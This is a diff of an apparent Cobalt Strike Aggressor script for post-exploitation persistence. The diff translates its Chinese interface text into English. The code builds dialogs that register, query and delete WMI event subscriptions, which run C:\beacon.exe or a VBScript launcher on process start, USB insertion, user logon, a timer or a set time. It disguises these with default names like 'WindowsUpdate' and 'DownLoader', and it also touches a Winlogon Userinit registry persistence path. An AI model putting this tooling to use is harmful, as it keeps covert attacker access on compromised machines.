-					$Dialog = dialog("查看WMI事件订阅", %(NamespaceName => "root/subscription" , EventFilterName => "", EventConsumerName => "", bid => $bid , BindingTo => 'Like', RunType => "CommandLine"), lambda({
+					$Dialog = dialog("View WMIEvents Subscriptions", %(NamespaceName => "root/subscription" , EventFilterName => "", EventConsumerName => "", bid => $bid , BindingTo => 'Like', RunType => "CommandLine"), lambda({
 						local('$bid $EventFilterName $EventConsumerName');
 						$bid = $3['bid'];
 						$EventFilterName = $3['EventFilterName'];
@@ -1121,21 +1122,21 @@ menu "☆ 权限维持"{
 						}
 					}));
 				
-					dialog_description($Dialog, "检查事件订阅情况，留空为查看全部。");
-					drow_text($Dialog, "NamespaceName",  "命名空间:");
-					drow_combobox($Dialog, "BindingTo", "事件绑定器查询: ", @("Like","Any"));
-					drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-					drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-					drow_combobox($Dialog, "RunType", "事件消费者类名: ", @("CommandLine","ActiveScript"));
-					dbutton_action($Dialog, "检查");
+					dialog_description($Dialog, "Check Events subscription status, leave blank to see all.");
+					drow_text($Dialog, "NamespaceName",  "Namespace:");
+					drow_combobox($Dialog, "BindingTo", "Events Binder Query: ", @("Like","Any"));
+					drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+					drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+					drow_combobox($Dialog, "RunType", "Events Consumer Name: ", @("CommandLine","ActiveScript"));
+					dbutton_action($Dialog, "Check");
 					dialog_show($Dialog);
 				}
 			}
 			
-			item "删除事件订阅" {
+			item "Delete Events Subscribed" {
 				local('$bid');
 				foreach $bid ($1){	
-					$Dialog = dialog("删除WMI事件订阅", %(NamespaceName => "root/subscription" , EventFilterName => "WindowsUpdate", EventConsumerName => "DownLoader", bid => $bid , BindingTo => 'Like', RunType => "CommandLine"), lambda({
+					$Dialog = dialog("Delete WMIEvents Subscribed", %(NamespaceName => "root/subscription" , EventFilterName => "WindowsUpdate", EventConsumerName => "DownLoader", bid => $bid , BindingTo => 'Like', RunType => "CommandLine"), lambda({
 					local('$bid $EventFilterName $EventConsumerName');
 					$bid = $3['bid'];
 					$EventFilterName = $3['EventFilterName'];
@@ -1162,13 +1163,13 @@ menu "☆ 权限维持"{
 					}
 				}));
 				
-					dialog_description($Dialog, "根据筛选器名和消费者名来删除事件订阅,留空则为全部删除。");
-					drow_text($Dialog, "NamespaceName",  "命名空间:");
-					drow_combobox($Dialog, "BindingTo", "事件绑定器删除: ", @("Like","Any"));
-					drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-					drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-					drow_combobox($Dialog, "RunType", "事件消费者类名: ", @("CommandLine","ActiveScript"));
-					dbutton_action($Dialog, "删除");
+					dialog_description($Dialog, "Delete Events subscriptions based on filter name and consumer name, leave blank for Delete All.");
+					drow_text($Dialog, "NamespaceName",  "Namespace:");
+					drow_combobox($Dialog, "BindingTo", "Events Binder Delete : ", @("Like","Any"));
+					drow_text($Dialog, "EventFilterName",  "Event Filter Name:");
+					drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+					drow_combobox($Dialog, "RunType", "Events Consumer Category Name: ", @("CommandLine","ActiveScript"));
+					dbutton_action($Dialog, "Delete ");
 					dialog_show($Dialog);
 				}
 			}
@@ -1193,9 +1194,9 @@ menu "☆ 权限维持"{
 
 			$Tmp = 'Set obj = createobject("wscript.shell"):obj.run "cmd /c C:\\beacon.exe":';
 			
-			#检查权限
+			#Check Permissions
 			if (-isadmin $bid){
-				#检查输入
+				#Check Input
 				if($EventFilterName eq "" || $EventConsumerName eq ""){
 					blog($bid,"Confirm Your input.");
 				}
@@ -1203,15 +1204,15 @@ menu "☆ 权限维持"{
 				{
 					if($RunType  eq "CommandLine"){
 						
-						#检查事件类型
+						#Check Events type
 						if($Trigger eq "ProcessStart"){
 							if($ProcessName eq ""){
-								$Dialog = dialog("进程名称设置",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ProcessName => "LogonUI.exe" , RunType => $RunType , bid => $bid),&RegWMI);
-								dialog_description($Dialog, "设置事件要匹配的进程,当进程启动时会触发事件消费者命令行执行。");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
+								$Dialog = dialog("Process name Settings ",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ProcessName => "LogonUI.exe" , RunType => $RunType , bid => $bid),&RegWMI);
+								dialog_description($Dialog, "Settings Events The process to be matched, when the process starts willTrigger Events Consumers Command line Execution。");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
 								drow_text($Dialog, "CommandLineTemplate",  "CommandLine:");
-								drow_text($Dialog, "ProcessName",  "进程名称:");
+								drow_text($Dialog, "ProcessName",  "Process name:");
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}else{
@@ -1223,10 +1224,10 @@ menu "☆ 权限维持"{
 						
 						}else if($Trigger eq "InsertUSB"){
 							if($CommandLineTemplate eq ""){
-								$Dialog = dialog("命令行设置",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, RunType => $RunType , bid => $bid),&RegWMI);
-								dialog_description($Dialog, "设置事件要匹配的进程,当进程启动时会触发事件消费者命令行执行。");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
+								$Dialog = dialog("Command行Settings ",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, RunType => $RunType , bid => $bid),&RegWMI);
+								dialog_description($Dialog, "Settings Events will match the process, and when the process starts it will Trigger Events consumer Command line Execution.");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
 								drow_text($Dialog, "CommandLineTemplate",  "CommandLine:");
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
@@ -1238,13 +1239,13 @@ menu "☆ 权限维持"{
 							}
 						}else if($Trigger eq "UserLogon"){
 							if($UserName eq ""){
-								$Dialog = dialog("设置用户",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType , bid => $bid ),&RegWMI);
-								dialog_description($Dialog, "当设置的用户登录时触发命令执行。");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
+								$Dialog = dialog("Settings User ",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType , bid => $bid ),&RegWMI);
+								dialog_description($Dialog, "Trigger CommandExecution when User of Settings logs in.");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
 								drow_text($Dialog, "CommandLineTemplate",  "CommandLine:");
-								drow_text($Dialog, "Domain",  "域名:");
-								drow_text($Dialog, "UserName",  "用户名:");
+								drow_text($Dialog, "Domain",  "Domain Name:");
+								drow_text($Dialog, "UserName",  "User Name:");
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}else{
@@ -1255,13 +1256,13 @@ menu "☆ 权限维持"{
 							}                                                                                                                               
 						}else if($Trigger eq "Interval"){
 							if($IntervalPeriod eq ""){
-								$Dialog = dialog("设置事件通知时间间隔",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, IntervalPeriod => "3600" ,TimerId => "WindowsTimer_".ticks(),RunType => $RunType , bid => $bid ),&RegWMI);
-								dialog_description($Dialog, "每隔一定时间产生事件通知,默认60分钟。");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
+								$Dialog = dialog("Settings Events Notification interval",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, IntervalPeriod => "3600" ,TimerId => "WindowsTimer_".ticks(),RunType => $RunType , bid => $bid ),&RegWMI);
+								dialog_description($Dialog, "Generate Events notifications every certain time, default 60 minutes.");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
 								drow_text($Dialog, "CommandLineTemplate",  "CommandLine:");
-								drow_text($Dialog, "IntervalPeriod",  "间隔事件(单位 秒):");
-								drow_text($Dialog, "TimerId",  "定时器名称:");
+								drow_text($Dialog, "IntervalPeriod",  "Interval Period (in seconds):");
+								drow_text($Dialog, "TimerId",  "Timer Id name:");
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}else{
@@ -1272,13 +1273,13 @@ menu "☆ 权限维持"{
 							}
 						}else if($Trigger eq "Timed"){
 							if($ExecutionTime eq ""){
-								$Dialog = dialog("指定某个时间发起事件通知",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ExecutionTime => formatDate((ticks()+(1000 * 40 * 1)),"MM/dd/yyyy HH:mm:ss") , TimerId => "WindowsTimer_".ticks(),RunType => $RunType , bid => $bid ),&RegWMI);
-								dialog_description($Dialog, "设置一个时间发起事件通知，如'MM/dd/yyyy HH:mm:ss'");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
+								$Dialog = dialog("Specify a time to launch Events notifications",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ExecutionTime => formatDate((ticks()+(1000 * 40 * 1)),"MM/dd/yyyy HH:mm:ss") , TimerId => "WindowsTimer_".ticks(),RunType => $RunType , bid => $bid ),&RegWMI);
+								dialog_description($Dialog, "Settings A time to initiate Events notifications, such as 'MM/dd/yyyy HH:mm:ss'");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
 								drow_text($Dialog, "CommandLineTemplate",  "CommandLine:");
-								drow_text($Dialog, "ExecutionTime",  "执行时间:");
-								drow_text($Dialog, "TimerId",  "定时器名称:");
+								drow_text($Dialog, "ExecutionTime",  "Execution Time:");
+								drow_text($Dialog, "TimerId",  "Timer ID name:");
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}else{
@@ -1291,8 +1292,8 @@ menu "☆ 权限维持"{
 								if($CommandLineTemplate eq ""){
 									$Dialog = dialog("Set CommandLine",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger,RunType => $RunType , bid => $bid ),&RegWMI);
 									dialog_description($Dialog, "Set CommandLine");
-									drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-									drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
+									drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+									drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
 									drow_text($Dialog, "CommandLineTemplate",  "CommandLine:");
 									dbutton_action($Dialog, "RegWMI");
 									dialog_show($Dialog);
@@ -1309,13 +1310,13 @@ menu "☆ 权限维持"{
 					}else if($RunType  eq "ActiveScript"){
 						if($Trigger eq "ProcessStart"){
 							if($ProcessName eq ""){
-								$Dialog = dialog("进程名称设置",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ProcessName => "LogonUI.exe" ,RunType => $RunType , ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid),&RegWMI);
-								dialog_description($Dialog, "设置事件要匹配的进程,当进程启动时会触发事件消费者命令行执行。");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-								drow_text($Dialog, "ProcessName",  "进程名称:");
-								drow_combobox($Dialog, "ScriptingEngine", "脚本解释器引擎: ", @("VBScript","JScript"));
-								drow_text_big($Dialog, "PermanentScript",  "脚本内容:");
+								$Dialog = dialog("Process Name says Settings ",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ProcessName => "LogonUI.exe" ,RunType => $RunType , ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid),&RegWMI);
+								dialog_description($Dialog, "Settings Events will match the process, and when the process starts it will Trigger Events consumer Command line Execution.s");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+								drow_text($Dialog, "ProcessName",  "Process Name:");
+								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
+								drow_text_big($Dialog, "PermanentScript",  "Script content:");
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}else{
@@ -1328,11 +1329,11 @@ menu "☆ 权限维持"{
 						}else if($Trigger eq "InsertUSB"){
 							if($PermanentScript eq ""){
 								$Dialog = dialog($Trigger,%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
-								dialog_description($Dialog, "为事件 ".$Trigger." 设置执行内容");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-								drow_text_big($Dialog, "PermanentScript",  "脚本内容:");
-								drow_combobox($Dialog, "ScriptingEngine", "脚本解释器引擎: ", @("VBScript","JScript"));
+								dialog_description($Dialog, "for Events ".$Trigger." Settings Execution内容");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+								drow_text_big($Dialog, "PermanentScript",  "Script content:");
+								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}
@@ -1345,14 +1346,14 @@ menu "☆ 权限维持"{
 						}else if($Trigger eq "UserLogon"){
 							if($UserName eq "")
 							{
-								$Dialog = dialog("设置用户",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
-								dialog_description($Dialog, "当设置的用户登录时触发命令执行。");
-								drow_text($Dialog, "Domain",  "域名:");
-								drow_text($Dialog, "UserName",  "用户名:");
-								drow_text_big($Dialog, "PermanentScript",  "脚本内容:");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-								drow_combobox($Dialog, "ScriptingEngine", "脚本解释器引擎: ", @("VBScript","JScript"));
+								$Dialog = dialog("Settings User ",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
+								dialog_description($Dialog, "Trigger CommandExecution when User of Settings logs in.");
+								drow_text($Dialog, "Domain",  "Domain Name:");
+								drow_text($Dialog, "UserName",  "User Name:");
+								drow_text_big($Dialog, "PermanentScript",  "Script content:");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}else{
@@ -1363,14 +1364,14 @@ menu "☆ 权限维持"{
 							}                                                                                                                               
 						}else if($Trigger eq "Interval"){
 							if($IntervalPeriod eq ""){
-								$Dialog = dialog("设置事件通知时间间隔",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,Trigger => $Trigger, IntervalPeriod => "3600" , TimerId => "WindowsTimer_".ticks() ,RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
-								dialog_description($Dialog, "每隔一定时间产生事件通知,默认60分钟。");
-								drow_text_big($Dialog, "PermanentScript",  "脚本内容:");
-								drow_text($Dialog, "TimerId",  "定时器名称:");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-								drow_combobox($Dialog, "ScriptingEngine", "脚本解释器引擎: ", @("VBScript","JScript"));
-								drow_text($Dialog, "IntervalPeriod",  "间隔事件(单位 秒):");
+								$Dialog = dialog("Settings Events Notification Time interval",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,Trigger => $Trigger, IntervalPeriod => "3600" , TimerId => "WindowsTimer_".ticks() ,RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
+								dialog_description($Dialog, "Generate Events notifications every certain time, default 60 minutes.");
+								drow_text_big($Dialog, "PermanentScript",  "Script content:");
+								drow_text($Dialog, "TimerId",  "Timer Name or ID:");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
+								drow_text($Dialog, "IntervalPeriod",  "IntervalEvents (in seconds):");
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}else{
@@ -1381,14 +1382,14 @@ menu "☆ 权限维持"{
 							}
 						}else if($Trigger eq "Timed"){
 							if($ExecutionTime eq ""){
-								$Dialog = dialog("指定某个时间发起事件通知",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,Trigger => $Trigger, ExecutionTime => formatDate((ticks()+(1000 * 40 * 1)),"MM/dd/yyyy HH:mm:ss") , TimerId => "WindowsTimer_".ticks(), RunType => $RunType , ScriptingEngine => 'VBScript', PermanentScript => $Tmp  ,bid => $bid ),&RegWMI);
-								dialog_description($Dialog, "设置一个时间发起事件通知，如'MM/dd/yyyy HH:mm:ss'");
-								drow_text_big($Dialog, "PermanentScript",  "脚本内容:");
-								drow_text($Dialog, "ExecutionTime",  "执行时间:");
-								drow_text($Dialog, "TimerId",  "定时器名称:");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-								drow_combobox($Dialog, "ScriptingEngine", "脚本解释器引擎: ", @("VBScript","JScript"));
+								$Dialog = dialog("Specify a Time to initiate Events notifications",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,Trigger => $Trigger, ExecutionTime => formatDate((ticks()+(1000 * 40 * 1)),"MM/dd/yyyy HH:mm:ss") , TimerId => "WindowsTimer_".ticks(), RunType => $RunType , ScriptingEngine => 'VBScript', PermanentScript => $Tmp  ,bid => $bid ),&RegWMI);
+								dialog_description($Dialog, "Settings A Time initiates an Events notification, such as 'MM/dd/yyyy HH:mm:ss'");
+								drow_text_big($Dialog, "PermanentScript",  "Script content:");
+								drow_text($Dialog, "ExecutionTime",  "ExecutionTime:");
+								drow_text($Dialog, "TimerId",  "Timer Name or ID:");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}else{
@@ -1413,13 +1414,13 @@ menu "☆ 权限维持"{
 						if($Trigger eq "ProcessStart"){
 							if($ProcessName eq "")
 							{
-								$Dialog = dialog("进程名称设置",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ProcessName => "LogonUI.exe" ,RunType => $RunType , ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid),&RegWMI);
-								dialog_description($Dialog, "设置事件要匹配的进程,当进程启动时会触发事件消费者命令行执行。");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-								drow_text($Dialog, "ProcessName",  "进程名称:");
-								drow_combobox($Dialog, "ScriptingEngine", "脚本解释器引擎: ", @("VBScript","JScript"));
-								drow_text_big($Dialog, "PermanentScript",  "脚本内容:");
+								$Dialog = dialog("Process Name PID? Settings",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ProcessName => "LogonUI.exe" ,RunType => $RunType , ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid),&RegWMI);
+								dialog_description($Dialog, "Settings Events will match the process, and when the process starts it will Trigger Events consumer Command line Execution.");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+								drow_text($Dialog, "ProcessName",  "Process Name:");
+								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
+								drow_text_big($Dialog, "PermanentScript",  "Script content:");
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}else{
@@ -1433,11 +1434,11 @@ menu "☆ 权限维持"{
 						{
 							if($PermanentScript eq ""){
 								$Dialog = dialog($Trigger,%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
-								dialog_description($Dialog, "为事件 ".$Trigger." 设置执行内容");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-								drow_text_big($Dialog, "PermanentScript",  "脚本内容:");
-								drow_combobox($Dialog, "ScriptingEngine", "脚本解释器引擎: ", @("VBScript","JScript"));
+								dialog_description($Dialog, "for Events ".$Trigger." Settings Execution Content");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+								drow_text_big($Dialog, "PermanentScript",  "Script content:");
+								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}
@@ -1453,14 +1454,14 @@ menu "☆ 权限维持"{
 							
 							if($UserName eq "")
 							{
-								$Dialog = dialog("设置用户",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
-								dialog_description($Dialog, "当设置的用户登录时触发命令执行。");
-								drow_text($Dialog, "Domain",  "域名:");
-								drow_text($Dialog, "UserName",  "用户名:");
-								drow_text_big($Dialog, "PermanentScript",  "脚本内容:");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-								drow_combobox($Dialog, "ScriptingEngine", "脚本解释器引擎: ", @("VBScript","JScript"));
+								$Dialog = dialog("Settings User ",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
+								dialog_description($Dialog, "Trigger CommandExecution when User of Settings logs in.");
+								drow_text($Dialog, "Domain",  "Domain Name:");
+								drow_text($Dialog, "UserName",  "User Name:");
+								drow_text_big($Dialog, "PermanentScript",  "Script content:");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}else{
@@ -1473,14 +1474,14 @@ menu "☆ 权限维持"{
 						}else if($Trigger eq "Interval"){
 							if($IntervalPeriod eq "")
 							{
-								$Dialog = dialog("设置事件通知时间间隔",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,Trigger => $Trigger, IntervalPeriod => "3600" , TimerId => "WindowsTimer",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
-								dialog_description($Dialog, "每隔一定时间产生事件通知,默认60分钟。");
-								drow_text_big($Dialog, "PermanentScript",  "脚本内容:");
-								drow_text($Dialog, "TimerId",  "定时器名称:");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-								drow_combobox($Dialog, "ScriptingEngine", "脚本解释器引擎: ", @("VBScript","JScript"));
-								drow_text($Dialog, "IntervalPeriod",  "间隔事件(单位 秒):");
+								$Dialog = dialog("Settings Events Notification Time interval",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,Trigger => $Trigger, IntervalPeriod => "3600" , TimerId => "WindowsTimer",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
+								dialog_description($Dialog, "Generate Events notifications every certain time, default 60 minutes.s");
+								drow_text_big($Dialog, "PermanentScript",  "Script content:");
+								drow_text($Dialog, "TimerId",  "Timer Name or ID:");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
+								drow_text($Dialog, "IntervalPeriod",  "IntervalEvents (in seconds):");
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}else{
@@ -1491,14 +1492,14 @@ menu "☆ 权限维持"{
 							}
 						}else if($Trigger eq "Timed"){
 							if($ExecutionTime eq ""){
-								$Dialog = dialog("指定某个时间发起事件通知",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ExecutionTime => formatDate((ticks()+(1000 * 40 * 1)),"MM/dd/yyyy HH:mm:ss") , TimerId => "WindowsTimer_".ticks(), RunType => $RunType , ScriptingEngine => 'VBScript', PermanentScript => $Tmp  ,bid => $bid ),&RegWMI);
-								dialog_description($Dialog, "设置一个时间发起事件通知，如'MM/dd/yyyy HH:mm:ss'");
-								drow_text_big($Dialog, "PermanentScript",  "脚本内容:");
-								drow_text($Dialog, "ExecutionTime",  "执行时间:");
-								drow_text($Dialog, "TimerId",  "定时器名称:");
-								drow_text($Dialog, "EventFilterName",  "事件筛选器名称:");
-								drow_text($Dialog, "EventConsumerName",  "事件消费者名称:");
-								drow_combobox($Dialog, "ScriptingEngine", "脚本解释器引擎: ", @("VBScript","JScript"));
+								$Dialog = dialog("Specify a Time to initiate Events notifications",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ExecutionTime => formatDate((ticks()+(1000 * 40 * 1)),"MM/dd/yyyy HH:mm:ss") , TimerId => "WindowsTimer_".ticks(), RunType => $RunType , ScriptingEngine => 'VBScript', PermanentScript => $Tmp  ,bid => $bid ),&RegWMI);
+								dialog_description($Dialog, "Settings A Time initiates an Events notification, such as 'MM/dd/yyyy HH:mm:ss'");
+								drow_text_big($Dialog, "PermanentScript",  "Script content:");
+								drow_text($Dialog, "ExecutionTime",  "ExecutionTime:");
+								drow_text($Dialog, "TimerId",  "Timer Name or ID:");
+								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
+								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
+								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
 								dbutton_action($Dialog, "RegWMI");
 								dialog_show($Dialog);
 							}else{
@@ -1542,7 +1543,7 @@ menu "☆ 权限维持"{
 			$user = replace(beacon_info($bid, "user"), " \\*", "");
 			blog($bid, "-------".getnow()."-------");
 			if($3['RegItem'] eq "Winlogon Userinit"){
-				#HKLM位置,区分进程位数,需要管理员权限,根据系统位数加载注册表。
+				#HKLM location, distinguish process bits, require administrator privileges, load Registration Form according to system bits.
 				$Key = "\"HKLM";
 				blog($bid, "Location:HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon, KeyName:Userinit");
 				$Prefix = replace($Prefix,'Windows',"Windows NT");
@@ -1556,10 +1557,10 @@ menu "☆ 权限维持"{
